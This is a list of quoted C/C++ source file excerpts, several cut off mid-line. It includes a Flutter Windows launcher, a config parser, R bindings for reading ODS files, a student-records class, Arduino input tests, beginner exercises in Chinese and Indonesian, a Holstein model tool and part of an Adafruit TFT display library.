    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"plantdroid\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ConfigDB.cpp                                       :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: alappas <alappas@student.42wolfsburg.de    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/06/03 14:49:37 by alappas           #+#    #+#             */\n/*   Updated: 2024/06/03 14:49:38 by alappas          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n\n\n#include \"../../inc/ConfigDB.hpp\"\n\nConfigDB::ConfigDB()\n{\n    counter = 0;\n}\n\nConfigDB::~ConfigDB() {}\n\nConfigDB::ConfigDB(const ConfigDB &rhs)\n    : _variablePath(rhs._variablePath),\n      sectionCounts(rhs.sectionCounts),\n      _keyValues(rhs._keyValues),\n      groupedServers(rhs.groupedServers),\n      groupedRootData(rhs.groupedRootData),\n      counter(rhs.counter) {\n}\n\nConfigDB &ConfigDB::operator=(const ConfigDB &rhs) {\n    if (this != &rhs) {\n        _variablePath = rhs._variablePath;\n        sectionCounts = rhs.sectionCounts;\n        _keyValues = rhs._keyValues;\n        groupedServers = rhs.groupedServers;\n        groupedRootData = rhs.groupedRootData;\n        counter = rhs.counter;\n    }\n    return *this;\n}\n\n\nvoid ConfigDB::pushInBase(std::string env_name)\n{\n    this->_variablePath.push_back(env_name);\n}\n\nvoid ConfigDB::eraseLastSection()\n{\n    if (!this->_variablePath.empty())\n        this->_variablePath.pop_back();\n}\n\nstd::string ConfigDB::getFullPathKey()\n{\n    VecStr::iterator it;\n    std::string finalKey;\n\n    for (it = _variablePath.begin(); it != _variablePath.end(); it++)\n        finalKey += *it + \".\";\n    return finalKey;\n}\n\nstd::string ConfigDB::getKeyWithoutLastSection()\n{\n    VecStr::iterator it;\n    VecStr tmp = this->_variablePath;\n    std::string finalKey;\n\n    if (!tmp.empty())\n    {\n        tmp.pop_back();\n    }\n    for (it = tmp.begin(); it != tmp.end(); it++)\n        finalKey += *it + \".\";\n    return finalKey;\n}\n\nstd::string ConfigDB::readFile(char **argv)\n{\n    std::string configData;\n    std::string lastLine;\n    std::string line;\n    std::string configFile = argv[1];\n    std::ifstream file(configFile.c_str());\n\n    if (!file)\n        ft_errors(configFile, 2);\n\n    while (std::getline(file, line))\n    {\n        std::size_t commentPos = line.find('#');\n        if (commentPos != std::string::npos)\n        {\n            line = line.substr(0, commentPos);\n        }\n        line.erase(0, line.find_first_not_of(\" \\t\\n\\r\\f\\v\"));\n        line.erase(line.find_last_not_of(\" \\t\\n\\r\\f\\v\") + 1);\n\n        if (!line.empty() && line[line.size() - 1] == ' ')\n            lastLine += line.substr(0, line.size() - 1) + \" \";\n        else\n        {\n            if (!lastLine.empty())\n            {\n                lastLine += line;\n                configData += lastLine + \"\\n\";\n                lastLine.clear();\n            }\n            else\n                configData += line + \"\\n\";\n        }\n    }\n    if (!lastLine.empty())\n        configData += lastLine;\n    if (checkCurly(configData))\n        ft_errors(\"curly \", 3);\n    file.close();\n    return configData;\n}\n\nstd::string ConfigDB::handleKeySection(int &start, int &end, std::string &line)\n{\n    std::string currentSection = \"\";\n\n    trimWordFromEnd(start, end, line);\n    currentSection = line.substr(start, end + 1);\n    std::replace(currentSection.begin(), currentSection.end(), ' ', '_');\n    this->pushInBase(currentSection);\n    if (sectionCounts.find(currentSection) == sectionCounts.end())\n        sectionCounts[currentSection] = 0;\n    else\n        sectionCounts[currentSection]++;\n    \n    std::vector<std::string>::iterator it = this->_variablePath.begin();\n    bool server = false;\n    while (it != this->_variablePath.end())\n    {\n        if (*it == \"server\")\n            server = true;\n        it++;\n    }\n    if (sectionCounts[currentSection] >= 0)\n    {\n        std::stringstream ss;\n        ss << \"[\" << ((!server) ? sectionCounts[currentSection] : sectionCounts[\"server\"]) << \"]\";\n        currentSection += ss.str();\n    }\n    return currentSection;\n}\n\nvoid ConfigDB::printKeyValue()\n{\n    typedef std::map<std::string, VecStr>::const_iterator MapIterator;\n\n    for (MapIterator it1 = _keyValues.begin(); it1 != _keyValues.end(); ++it1)\n    {\n        std::cout << \"Key: \" << it1->first\n                  << \"\\nValue(s): \" << std::endl;\n        const VecStr &values = it1->second;\n        for (VecStr::const_iterator it2 = values.begin(); it2 != values.end(); ++it2)\n            std::cout << \"  \" << *it2 << std::endl;\n        std::cout << \"\\n\";\n    }\n}\n\nvoid ConfigDB::fillMap(std::st",
    "// Generated by cpp11: do not edit by hand\n// clang-format off\n\n\n#include \"cpp11/declarations.hpp\"\n#include <R_ext/Visibility.h>\n\n// get_sheet_names.cpp\ncpp11::strings get_sheet_names_(const std::string file, const bool include_external_data);\nextern \"C\" SEXP _readODS_get_sheet_names_(SEXP file, SEXP include_external_data) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(get_sheet_names_(cpp11::as_cpp<cpp11::decay_t<const std::string>>(file), cpp11::as_cpp<cpp11::decay_t<const bool>>(include_external_data)));\n  END_CPP11\n}\n// get_sheet_names.cpp\ncpp11::strings get_flat_sheet_names_(const std::string file, const bool include_external_data);\nextern \"C\" SEXP _readODS_get_flat_sheet_names_(SEXP file, SEXP include_external_data) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(get_flat_sheet_names_(cpp11::as_cpp<cpp11::decay_t<const std::string>>(file), cpp11::as_cpp<cpp11::decay_t<const bool>>(include_external_data)));\n  END_CPP11\n}\n// read_flat_ods_.cpp\ncpp11::strings read_flat_ods_(const std::string file, int start_row, int stop_row, int start_col, int stop_col, const int sheet_index, const bool formula_as_formula);\nextern \"C\" SEXP _readODS_read_flat_ods_(SEXP file, SEXP start_row, SEXP stop_row, SEXP start_col, SEXP stop_col, SEXP sheet_index, SEXP formula_as_formula) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(read_flat_ods_(cpp11::as_cpp<cpp11::decay_t<const std::string>>(file), cpp11::as_cpp<cpp11::decay_t<int>>(start_row), cpp11::as_cpp<cpp11::decay_t<int>>(stop_row), cpp11::as_cpp<cpp11::decay_t<int>>(start_col), cpp11::as_cpp<cpp11::decay_t<int>>(stop_col), cpp11::as_cpp<cpp11::decay_t<const int>>(sheet_index), cpp11::as_cpp<cpp11::decay_t<const bool>>(formula_as_formula)));\n  END_CPP11\n}\n// read_ods_.cpp\ncpp11::strings read_ods_(const std::string file, int start_row, int stop_row, int start_col, int stop_col, const int sheet_index, const bool formula_as_formula);\nextern \"C\" SEXP _readODS_read_ods_(SEXP file, SEXP start_row, SEXP stop_row, SEXP start_col, SEXP stop_col, SEXP sheet_index, SEXP formula_as_formula) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(read_ods_(cpp11::as_cpp<cpp11::decay_t<const std::string>>(file), cpp11::as_cpp<cpp11::decay_t<int>>(start_row), cpp11::as_cpp<cpp11::decay_t<int>>(stop_row), cpp11::as_cpp<cpp11::decay_t<int>>(start_col), cpp11::as_cpp<cpp11::decay_t<int>>(stop_col), cpp11::as_cpp<cpp11::decay_t<const int>>(sheet_index), cpp11::as_cpp<cpp11::decay_t<const bool>>(formula_as_formula)));\n  END_CPP11\n}\n// splice.cpp\nstd::string splice_sheet_(const std::string original_xml, const std::string sheet_file, const bool flat);\nextern \"C\" SEXP _readODS_splice_sheet_(SEXP original_xml, SEXP sheet_file, SEXP flat) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(splice_sheet_(cpp11::as_cpp<cpp11::decay_t<const std::string>>(original_xml), cpp11::as_cpp<cpp11::decay_t<const std::string>>(sheet_file), cpp11::as_cpp<cpp11::decay_t<const bool>>(flat)));\n  END_CPP11\n}\n// splice.cpp\nstd::string update_sheet_(const std::string original_xml, const std::string sheet_file, const bool flat, const int sheet_index);\nextern \"C\" SEXP _readODS_update_sheet_(SEXP original_xml, SEXP sheet_file, SEXP flat, SEXP sheet_index) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(update_sheet_(cpp11::as_cpp<cpp11::decay_t<const std::string>>(original_xml), cpp11::as_cpp<cpp11::decay_t<const std::string>>(sheet_file), cpp11::as_cpp<cpp11::decay_t<const bool>>(flat), cpp11::as_cpp<cpp11::decay_t<const int>>(sheet_index)));\n  END_CPP11\n}\n// write_sheet_file_.cpp\ncpp11::r_string write_sheet_file_(const std::string& filename, const cpp11::data_frame& x, const std::string& sheet_name, const bool row_names, const bool col_names, const bool na_as_string, const bool padding, const std::string& header, const std::string& footer);\nextern \"C\" SEXP _readODS_write_sheet_file_(SEXP filename, SEXP x, SEXP sheet_name, SEXP row_names, SEXP col_names, SEXP na_as_string, SEXP padding, SEXP header, SEXP footer) {\n  BEGIN_CPP11\n    return cpp11::as_sexp(write_sheet_file_(cpp11::as_cpp<cpp11::decay_t<const std::string&>>(filename), cpp11::as_cpp<cpp11::decay_t<const cpp11::data_frame&>>(x), cpp11::as_cpp<cpp11::decay_t<const std::string&>>(sheet_name), cpp11::as_cpp<cpp11::decay_t<const bool>>(row_names), cpp11::as_cpp<cpp11::decay_t<const bool>>(col_names), cpp11::as_cpp<cpp11::decay_t<const bool>>(na_as_string), cpp11::as_cpp<cpp11::decay_t<const bool>>(padding), cpp11::as_cpp<cpp11::decay_t<const std::string&>>(header), cpp11::as_cpp<cpp11::decay_t<const std::string&>>(footer)));\n  END_CPP11\n}\n// write_sheet_file_.cpp\ncpp11::r_string write_sheet_file_list_(const std::string& filename, const cpp11::list_of<cpp11::data_frame>& x, const std::string& sheet_name, const bool row_names, const bool col_names, const bool na_as_string, const bool padding, const std::string& header, const std::string& footer);\nextern \"C\" SEXP _readODS_write_sheet_file_list_(SEXP filename, SEXP x, SEXP sheet_name, SEXP row_names, SEXP col_names, SEXP na_as_string, SEXP padding, SEXP hea",
    "#include \"University.h\"\n\nUniversity::University (const University& unit) {\n    this->database = unit.database;\n}\n\nUniversity::University (const std::string filename) {\n    std::ifstream file (filename, std::ios::in);\n    if (file.is_open()) {\n        std::string row;\n        while (std::getline(file, row)) {\n            std::istringstream iss(row);\n            std::string word;\n            Student unit;\n            int count = 0;\n            grade g;\n            unsigned short session;\n            while (iss >> word) {\n                if (count == 0) { unit.setNumber(word); }\n                else if (count == 1) { unit.setFirstName(word); }\n                else if (count == 2) { unit.setMiddleName(word); }\n                else if (count == 3) { unit.setLastName(word); }\n                else if (count == 4) { unit.setYear(std::stoi(word)); }\n                else if (count == 5) { unit.setBirthday(word); }\n                else if (count == 6) { unit.setFaculty(word); }\n                else if (count == 7) { unit.setDepartment(word); }\n                else if (count == 8) { unit.setGroup(word); }\n                else if (count == 9) { unit.setGender(word); }\n                else if (count == 10) { session = std::stoi(word); }\n                else if (count == 11) { g.subject = word; }\n                else if (count == 12) { g.date = word; }\n                else if (count == 13) { g.mark = std::stoi(word); }\n                ++count;\n            }\n            if (this->database.isExists(unit)) {\n                unsigned int index = this->database.find(unit);\n                if (session > this->database[index].getNumberOfSessions()) {\n                    for (int i = 0; i < (session - this->database[index].getNumberOfSessions()); ++i) {\n                        this->database[index].createSession();\n                    }\n                }\n                this->database[index].appendGradeToSession(session, g);\n            }\n            else {\n                unit.createSession();\n                unit.appendGradeToSession(1, g);\n                this->database.append(unit);\n            }\n        }\n    }\n    else {\n        throw std::runtime_error(\"File does not exist\");\n    }\n    file.close();\n}\n\nUniversity& University::operator= (const University& unit) {\n    this->database = unit.database;\n    return *this;\n}\n\nstd::ostream& operator<< (std::ostream& os, University& unit) {\n    std::string toOut;\n    for (int i = 0; i < unit.database.length(); ++i) {\n        Student guy = unit.database[i];\n        List <List <grade>> sessions = guy.getSessions();\n        for (int j = 0; j < sessions.length(); ++j) {\n            for (int k = 0; k < sessions[j].length(); ++k) {\n                std::string row = \n                    guy.getNumber() + \" \" + \n                    guy.getFirstName() + \" \" + \n                    guy.getMiddleName() + \" \" + \n                    guy.getLastName() + \" \" + \n                    std::to_string(guy.getYear()) + \" \" + \n                    guy.getBirthday() + \" \" + \n                    guy.getFaculty() + \" \" + \n                    guy.getDepartment() + \" \" + \n                    guy.getGroup() + \" \" + \n                    guy.getGender() + \" \" + \n                    sessions[j][k].subject + \" \" + \n                    sessions[j][k].date + \" \" + \n                    std::to_string(sessions[j][k].mark) + \"\\n\";\n                toOut += row;\n            }\n        }\n    }\n    os << toOut;\n    return os;\n}\n\nvoid University::toFile (const std::string filename) {\n    std::string toOut;\n    for (int i = 0; i < this->database.length(); ++i) {\n        Student guy = this->database[i];\n        List <List <grade>> sessions = guy.getSessions();\n        for (int j = 0; j < sessions.length(); ++j) {\n            for (int k = 0; k < sessions[j].length(); ++k) {\n                std::string row = \n                    guy.getNumber() + \" \" + \n                    guy.getFirstName() + \" \" + \n                    guy.getMiddleName() + \" \" + \n                    guy.getLastName() + \" \" + \n                    std::to_string(guy.getYear()) + \" \" + \n                    guy.getBirthday() + \" \" + \n                    guy.getFaculty() + \" \" + \n                    guy.getDepartment() + \" \" + \n                    guy.getGroup() + \" \" + \n                    guy.getGender() + \" \" + \n                    std::to_string(j + 1) + \" \" + \n                    sessions[j][k].subject + \" \" + \n                    sessions[j][k].date + \" \" + \n                    std::to_string(sessions[j][k].mark) + \"\\n\";\n                toOut += row;\n            }\n        }\n    }\n    std::ofstream file(filename.c_str(), std::ios::trunc);\n    file << toOut;\n    file.close();\n}\n\nvoid University::append (const Student unit) {\n    this->database.append(unit);\n}\n\nvoid University::remove (const unsigned int index) {\n    this->database.remove(index);\n} \n\nunsigned int University::find (const Student unit) {\n    return this->database.find(unit);\n}\n\nbool University::isExi",
    "#include \"EMERGENZE_.h\"\n\nvoid TEST_send_result(String test_name, bool test_success, String test_message) {\n  String result = \" { \\\"name\\\": \\\"\" + test_name +\n                  \"\\\", \\\"result\\\": \\\"\" + (test_success ? \"ok\" : \"error\") +\n                  \"\\\", \\\"message\\\": \\\"\" + test_message + \"\\\"} \";\n  Serial.println(result);\n}\n\nvoid TEST_fotocellule() {\n  Serial.println(\"\");\n  Serial.println(\"TEST FOTOCELLULE\");\n\n  bool end = 0;\n  bool stato_fotoc_1 = digitalRead(FOTOCELLULA);\n  bool stato_fotoc_2 = digitalRead(FOTOCELLULA_2);\n  bool cambia_stato = 0;\n  bool cambia_stato_2 = 0;\n  unsigned long t_fotoc = millis();\n  Serial.println(\"Premere i due interruttori che simulano le due fotocellule\");\n\n  while(!end) {\n    if (!cambia_stato && (digitalRead(FOTOCELLULA) != stato_fotoc_1)) {      //  se premuto, il pedale cambia stato\n        cambia_stato = 1;\n    }\n    if (!cambia_stato_2 && (digitalRead(FOTOCELLULA_2) != stato_fotoc_2)) {      //  se premuto, il pedale cambia stato\n        cambia_stato_2 = 1;\n    }\n\n    if (cambia_stato && cambia_stato_2) {\n      end = 1;\n      Serial.println(\"FUNZIONANO ENTRAMBE LE FOTOCELLULE\");\n      Serial.println(\"{\\\"name\\\":\\\"Fotocellule\\\",\\\"result\\\":\\\"ok\\\"}\");\n    }\n    \n    if ((millis() - t_fotoc) > 10000) {\n      end = 1;     //  timeout\n      Serial.println(\"TIMEOUT\");\n    }\n  }\n\n  if (!cambia_stato && cambia_stato_2) {\n    Serial.println(\"{\\\"name\\\":\\\"Fotocellule\\\",\\\"result\\\":\\\"error\\\",\\\"error\\\":\\\"L'ingresso 'FOTOCELLULA' non funziona\\\"}\");\n    //return;\n  } else if (cambia_stato && !cambia_stato_2) {\n    Serial.println(\"{\\\"name\\\":\\\"Fotocellule\\\",\\\"result\\\":\\\"error\\\",\\\"error\\\":\\\"L'ingresso 'FOTOCELLULA_2' non funziona\\\"}\");\n    //return;\n  } else if (!cambia_stato && !cambia_stato_2) {\n    Serial.println(\"{\\\"name\\\":\\\"Fotocellule\\\",\\\"result\\\":\\\"error\\\",\\\"error\\\":\\\"I due ingressi 'FOTOCELLULA' e 'FOTOCELLULA_2' non funzionano\\\"}\");\n    //return;\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"FINE TEST FOTOCELLULE\");\n  Serial.println(\"\");\n}\n\nvoid TEST_funghi() {\n  Serial.println(\"\");\n  Serial.println(\"TEST FUNGHI\");\n\n  bool end = 0;\n  bool stato_fotoc_1 = digitalRead(FUNGO_1);\n  bool stato_fotoc_2 = digitalRead(FUNGO_2);\n  bool cambia_stato = 0;\n  bool cambia_stato_2 = 0;\n  unsigned long t_fotoc = millis();\n  Serial.println(\"Premere i due interruttori che simulano le due funghi\");\n\n  while(!end) {\n    if (!cambia_stato && (digitalRead(FUNGO_1) != stato_fotoc_1)) {      //  se premuto, il pedale cambia stato\n        cambia_stato = 1;\n    }\n    if (!cambia_stato_2 && (digitalRead(FUNGO_2) != stato_fotoc_2)) {      //  se premuto, il pedale cambia stato\n        cambia_stato_2 = 1;\n    }\n\n    if (cambia_stato && cambia_stato_2) {\n      end = 1;\n      Serial.println(\"FUNZIONANO ENTRAMBI I FUNGHI\");\n      Serial.println(\"{\\\"name\\\":\\\"Funghi\\\",\\\"result\\\":\\\"ok\\\"}\");\n    }\n    \n    if ((millis() - t_fotoc) > 10000) {\n      end = 1;     //  timeout\n      Serial.println(\"TIMEOUT\");\n    }\n  }\n\n  if (!cambia_stato && cambia_stato_2) {\n    Serial.println(\"{\\\"name\\\":\\\"Funghi\\\",\\\"result\\\":\\\"error\\\",\\\"error\\\":\\\"L'ingresso 'FUNGO_1' non funziona\\\"}\");\n    //return;\n  } else if (cambia_stato && !cambia_stato_2) {\n    Serial.println(\"{\\\"name\\\":\\\"Funghi\\\",\\\"result\\\":\\\"error\\\",\\\"error\\\":\\\"L'ingresso 'FUNGO_2' non funziona\\\"}\");\n    //return;\n  } else if (!cambia_stato && !cambia_stato_2) {\n    Serial.println(\"{\\\"name\\\":\\\"Funghi\\\",\\\"result\\\":\\\"error\\\",\\\"error\\\":\\\"I due ingressi 'FUNGO_1' e 'FUNGO_2' non funzionano\\\"}\");\n    //return;\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"FINE TEST FUNGHI\");\n  Serial.println(\"\");\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\n//\u8bbe\u8ba1\u4e00\u4e2a\u5706\u5f62\u7c7b\u548c\u70b9\u7c7b\r\n//\u8ba1\u7b97\u5706\u5f62\u548c\u70b9\u7684\u5173\u7cfb\r\n\r\n//\u70b9\u7684\u7ed3\u6784\u4f53\r\nstruct point {\r\n\tint x;\r\n\tint y;\r\n};\r\n\r\n//\u5706\u7684\u7c7b\r\nclass Circle {\r\nprivate:\r\n\tstruct point c_center;\r\n\tint c_radius;\r\n\r\npublic:\r\n\tvoid setCenter(int x, int y) {\r\n\t\tc_center.x = x;\r\n\t\tc_center.y = y;\r\n\t}\r\n\tstruct point getCenter() {\r\n\t\treturn c_center;\r\n\t}\r\n\r\n\tvoid setRadius(int radius) {\r\n\t\tc_radius = radius;\r\n\t}\r\n\tint getRadius() {\r\n\t\treturn c_radius;\r\n\t}\r\n};\r\n\r\n\r\n//\u70b9\u7684\u7c7b\r\nclass Point {\r\nprivate:\r\n\tstruct point pos;\r\npublic:\r\n\tvoid setPoint(int x,int y) {\r\n\t\tpos.x = x;\r\n\t\tpos.y = y;\r\n\t}\r\n\tstruct point getPoint() {\r\n\t\treturn pos;\r\n\t}\r\n};\r\n\r\n//\u8ba1\u7b97\u70b9\u5230\u5706\u5fc3\u7684\u8ddd\u79bb\r\ndouble distance;\r\ndouble caculateDis(Point pos,Circle center) {\r\n\tdouble distance;\r\n\treturn distance = (pos.getPoint().x - center.getCenter().x) * (pos.getPoint().x - center.getCenter().x) + (pos.getPoint().y - center.getCenter().y) * (pos.getPoint().y - center.getCenter().y);\r\n}\r\nint main() {\r\n\r\n\tCircle c1;\r\n\tc1.setCenter(0, 0);\r\n\tc1.setRadius(1);\r\n\r\n\tPoint p1;\r\n\tp1.setPoint(0,1);\r\n\t\r\n\t//\u8ba1\u7b97\u70b9\u5230\u5706\u5fc3\u7684\u8ddd\u79bbdistance\r\n\tdouble distance = caculateDis(p1,c1);\r\n\r\n\t//\u5224\u65ad\u70b9\u548c\u5706\u7684\u5173\u7cfb\r\n\t//1\u3001\u5982\u679cdistance\uff08\u70b9\u5230\u5706\u5fc3\u7684\u8ddd\u79bb\uff09\u5927\u4e8e\u534a\u5f84\uff0c\u5219\u70b9\u5728\u5706\u5916\r\n\t//2\u3001\u5982\u679c\u70b9\u5230\u5706\u5fc3\u7684\u8ddd\u79bb\u5c0f\u4e8e\u534a\u5f84\uff0c\u5219\u70b9\u5230\u5706\u5185\r\n\t//3\u3001\u5982\u679c\u70b9\u5230\u5706\u5fc3\u7684\u8ddd\u79bb\u7b49\u4e8e\u534a\u5f84\uff0c\u5219\u70b9\u5728\u5706\u4e0a\r\n\r\n\r\n\t//\u6c42\u51fa\u534a\u5f84\u7684\u5e73\u65b9\r\n\tdouble radius2 = (c1.getRadius() * c1.getRadius());\r\n\tif (distance <= radius2)\r\n\t{\r\n\t\tif (distance<radius2)\r\n\t\t{\r\n\t\t\tcout << \"\u70b9\u5728\u5706\u5185\" << endl;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"\u70b9\u5728\u5706\u4e0a\" << endl;\r\n\t\t}\r\n\t}\r\n\telse \r\n\t{\r\n\t\tcout << \"\u70b9\u5728\u5706\u5916\" << endl;\r\n\t}\r\n\r\n\t\r\n\r\n\tsystem(\"pause\");\r\n\treturn 0;\r\n}",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main() {\n    string baris;\n\n    // membuka file dalam mode menulis\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(\"contohfile.txt\");\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n    // unlimited loop untuk menulis\n    while (true) {\n        cout << \"- \";\n        // mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        // loop akan berhenti jika anda memasukan karakter q\n        if (baris == \"q\") break;\n        // menulis dan memasukan nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n    }\n    // selesai dalam menulis sekarang tutup filenya\n    outfile.close();\n\n    // membuka file dalam mode membaca\n    ifstream infile;\n    // menunjuk ke sebuah file\n    infile.open(\"contohfile.txt\");\n\n    cout << endl << \">= Membuka dan membaca file \" << endl;\n    // jika file ada maka\n    if (infile.is_open())\n    {\n        // melakukan perulangan setiap baris\n        while (getline(infile, baris))\n        {\n            // dan tampilkan disini\n            cout << baris << '\\n';\n        }\n        // tutup file tersebut setelah selesai\n        infile.close();\n    }\n    // jika tidak ditemukan file maka akan menampilkan ini\n    else cout << \"Unable to open file\";\n    return 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <string>\nusing namespace std;\n\nint main()\n{\n    // untuk menyimpan data berbentuk string\n    string baris;\n    // membuka file dalam metode menulis\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(\"contohfile.txt\");\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n    // unlimited loop untuk menulis\n    while (true) {\n        cout << \"- \";\n        // mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        // loop akan berhenti jika anda memasukkan karakter q\n        if (baris == \"q\") break;\n        // menulis dan memasukkan nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n    }\n\n    // membuka file dalam mode membaca\n    ifstream infile;\n    // menunjuk ke sebuah file\n    infile.open(\"contohfile.txt\");\n\n    cout << endl << \">= Membuka dan membaca file \" << endl;\n    // jika file ada maka\n    if (infile.is_open()) {\n        // melakukan perulangan setiap baris\n        while (getline(infile, baris))\n        {\n            // dan tampilkan di sini\n            cout << baris << '\\n';\n        }\n        // tutup file tersebut setelah selesai\n        infile.close();\n    }\n\n    // jika tidak ditemukan file maka akan menampilkan ini\n    else cout << \"unable to open file\";\n\n    return 0;\n}",
    "/* holstein model construction */\n\n#include <getopt.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include \"../holstein/lattice.h\"\n#include \"../holstein/svd.h\"\n\nusing namespace klnX;\n\nstatic const option long_op[]={\n    {\"input\",required_argument,NULL,'i'},\n    {\"tolerance\",required_argument,NULL,'t'},\n    {\"help\",no_argument,NULL,'h'},\n    {0,0,0,0}\n};\n\n\nint main( int argc, char ** argv )\n{\n    if(access(\"Op\",F_OK)==-1) { int status = mkdir(\"Op\",S_IRWXU | S_IRWXG | S_IROTH |S_IXOTH); \n    if(status!=0) { cout << \"Fail to create New Dir\" << endl; exit(1); } }\n    if(access(\"State\",F_OK)==-1) { int status = mkdir(\"State\",S_IRWXU | S_IRWXG | S_IROTH |S_IXOTH); \n    if(status!=0) { cout << \"Fail to create New Dir\" << endl; exit(1); } }\n \n    int ch;\n    int op_ind = 0;\n    string tole;\n    Holstein::DumpConfig Ir;\n    while((ch=getopt_long(argc,argv,\"i:t:h\",long_op,&op_ind))!=-1)\n    {\n        switch (ch) \n        {\n            case 'i':    \n                Holstein::read_dump(optarg, Ir);\n                break;\n            case 't':\n                tole = optarg;\n                break;\n            case 'h':\n                std::cout <<  \"Construct U(1)-symmetry conserved operators with mapping\\n\"\n                          <<  \"Usage: kln-holstein-map.a -i [file]\\n\"\n                          <<  \"Options:\\n\"\n                          <<  \"--input,-i                       Filename of input file\\n\"\n                          <<  \"--tolerance,-t                   Truncation tolerance\\n\"\n                          <<  \"--help,-h                        Show this message\" << std::endl;\n                return 0;\n                break;\n            case '?':\n                std::cout << \"Unknown Option!\\n\" << std::endl;\n                break;\n        }\n    }\n    // electronic states\n    Holstein::all_ele_states(Ir);\n\n    // all elementary operators\n    vector<Holstein::Operator> RPO,LPO,RAO,LAO;\n    Holstein::non_eye_op(RPO,Ir,Holstein::LocalOperator::PhyRaise);\n    Holstein::non_eye_op(LPO,Ir,Holstein::LocalOperator::PhyLower);\n    Holstein::non_eye_op(RAO,Ir,Holstein::LocalOperator::AuxRaise);\n    Holstein::non_eye_op(LAO,Ir,Holstein::LocalOperator::AuxLower);\n\n    // density operators\n    Holstein::all_density(RPO,LPO);\n    // total Hamiltonian\n    Holstein::totals(RPO,LPO,RAO,LAO,Ir,std::stod(tole));\n    return 0;\n}\n",
    "// IMPORTANT: LIBRARY MUST BE SPECIFICALLY CONFIGURED FOR EITHER TFT SHIELD\n// OR BREAKOUT BOARD USAGE.  SEE RELEVANT COMMENTS IN Adafruit_TFTLCD.h\n\n// Graphics library by ladyada/adafruit with init code from Rossum\n// MIT license\n\n#if defined(__SAM3X8E__)\n#include <include/pio.h>\n#define PROGMEM\n#define pgm_read_byte(addr) (*(const unsigned char *)(addr))\n#define pgm_read_word(addr) (*(const unsigned short *)(addr))\n#endif\n#ifdef __AVR__\n#include <avr/pgmspace.h>\n#endif\n#include \"Adafruit_TFTLCD.h\"\n#include \"pin_magic.h\"\n#include \"pins_arduino.h\"\n#include \"wiring_private.h\"\n\n//#define TFTWIDTH   320\n//#define TFTHEIGHT  480\n\n#define TFTWIDTH 240\n#define TFTHEIGHT 320\n\n// LCD controller chip identifiers\n#define ID_932X 0\n#define ID_7575 1\n#define ID_9341 2\n#define ID_HX8357D 3\n#define ID_UNKNOWN 0xFF\n\n#include \"registers.h\"\n\n// Constructor for breakout board (configurable LCD control lines).\n// Can still use this w/shield, but parameters are ignored.\nAdafruit_TFTLCD::Adafruit_TFTLCD(uint8_t cs, uint8_t cd, uint8_t wr, uint8_t rd,\n                                 uint8_t reset)\n    : Adafruit_GFX(TFTWIDTH, TFTHEIGHT) {\n\n#ifndef USE_ADAFRUIT_SHIELD_PINOUT\n  // Convert pin numbers to registers and bitmasks\n  _reset = reset;\n#ifdef __AVR__\n  csPort = portOutputRegister(digitalPinToPort(cs));\n  cdPort = portOutputRegister(digitalPinToPort(cd));\n  wrPort = portOutputRegister(digitalPinToPort(wr));\n  rdPort = portOutputRegister(digitalPinToPort(rd));\n#endif\n#if defined(__SAM3X8E__)\n  csPort = digitalPinToPort(cs);\n  cdPort = digitalPinToPort(cd);\n  wrPort = digitalPinToPort(wr);\n  rdPort = digitalPinToPort(rd);\n#endif\n  csPinSet = digitalPinToBitMask(cs);\n  cdPinSet = digitalPinToBitMask(cd);\n  wrPinSet = digitalPinToBitMask(wr);\n  rdPinSet = digitalPinToBitMask(rd);\n  csPinUnset = ~csPinSet;\n  cdPinUnset = ~cdPinSet;\n  wrPinUnset = ~wrPinSet;\n  rdPinUnset = ~rdPinSet;\n#ifdef __AVR__\n  *csPort |= csPinSet; // Set all control bits to HIGH (idle)\n  *cdPort |= cdPinSet; // Signals are ACTIVE LOW\n  *wrPort |= 